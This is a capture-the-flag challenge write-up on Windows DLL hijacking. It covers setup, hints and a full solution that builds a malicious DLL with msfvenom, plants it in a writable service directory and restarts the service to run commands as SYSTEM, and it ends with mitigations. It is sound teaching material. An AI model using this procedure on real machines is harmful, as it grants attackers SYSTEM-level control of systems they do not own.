# Challenge 1 — DLL Hijacking

**Difficulty:** Medium
**Category:** Windows Privilege Escalation
**Flag:** `C:\CTF\challenge_dll\flag.txt`

---

## Story

A monitoring service is running as SYSTEM. You found its application directory
and a README inside listing the DLLs it loads. One of them is loaded by name only —
no full path. You can write to that directory.

You are `ctfplayer` — a standard user.

---

## Setup

1. Start a **Windows VM**
2. Run PowerShell as Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

3. Log in as `ctfplayer` / `Player123!`

---

## Background: DLL Hijacking

When a Windows application loads a DLL by name only (e.g., `LoadLibrary("helper.dll")`),
Windows searches for it in this order:

1. The directory of the executable
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Directories in the `PATH` environment variable

If the application directory is writable and the DLL does not exist there yet,
you can plant a malicious DLL in that location. The next time the service starts,
your DLL loads in the service's process — which runs as SYSTEM.

---

## Hints

<details>
<summary>Hint 1</summary>
Read the README in the application directory:

```powershell
type "C:\Apps\MonitoringTool\README.txt"
```

Identify which DLL is loaded from the application directory.
Confirm you can write there:

```powershell
icacls "C:\Apps\MonitoringTool"
```
</details>

<details>
<summary>Hint 2</summary>
You need to build a DLL. On your Kali/Linux attack machine:

```bash
msfvenom -p windows/x64/exec CMD='...' -f dll -o helper.dll
```

Transfer it to the Windows VM and drop it in the application directory.
</details>

<details>
<summary>Hint 3</summary>
For the CTF payload, copy the flag to a readable location:

```
CMD=cmd /c copy C:\CTF\challenge_dll\flag.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F
```

After dropping the DLL, restart the service to trigger it:

```powershell
Restart-Service MonitoringService
```
</details>

---

## Solution

<details>
<summary>Click to reveal — try on your own first!</summary>

### Step 1 — Identify the target DLL

```powershell
type "C:\Apps\MonitoringTool\README.txt"
icacls "C:\Apps\MonitoringTool"
```

`helper.dll` is loaded from the application directory, and `ctfplayer` has write access.

### Step 2 — Generate the malicious DLL (on Kali)

```bash
msfvenom -p windows/x64/exec \
  CMD='cmd /c copy C:\CTF\challenge_dll\flag.txt C:\Users\Public\flag.txt && icacls C:\Users\Public\flag.txt /grant Everyone:F' \
  -f dll -o helper.dll
```

### Step 3 — Drop the DLL into the application directory

Transfer `helper.dll` to the Windows VM, then:

```powershell
Copy-Item helper.dll "C:\Apps\MonitoringTool\helper.dll"
```

### Step 4 — Restart the service

```powershell
Restart-Service MonitoringService
```

The service loads `helper.dll` from its own directory before checking System32.
Your DLL executes as SYSTEM.

### Step 5 — Read the flag

```powershell
type C:\Users\Public\flag.txt
```

```
CTF{dll_h1j4ck_s3rv1c3_pwn3d}
```

### Why this works

Windows DLL search order places the application directory first. If that directory
is writable by a low-privileged user and the service requests a DLL that does not
yet exist there, an attacker can plant a malicious DLL that will be loaded instead
of the legitimate one from System32. Mitigations: use absolute paths in `LoadLibrary`,
set application directories as read-only for standard users, and enable Safe DLL Search
Mode (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode = 1`).

</details>
